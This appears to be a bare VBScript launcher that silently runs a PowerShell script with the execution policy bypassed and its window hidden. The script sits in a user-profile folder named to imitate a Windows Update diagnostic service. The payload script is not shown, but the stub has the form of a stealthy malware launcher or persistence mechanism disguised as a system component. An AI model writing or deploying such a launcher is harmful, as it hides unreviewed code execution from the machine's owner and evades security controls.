Set objShell = CreateObject("WScript.Shell")
strPath = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\WinUpdateDiagnostic\UpdateAuditService.ps1"""
objShell.Run strPath, 0, False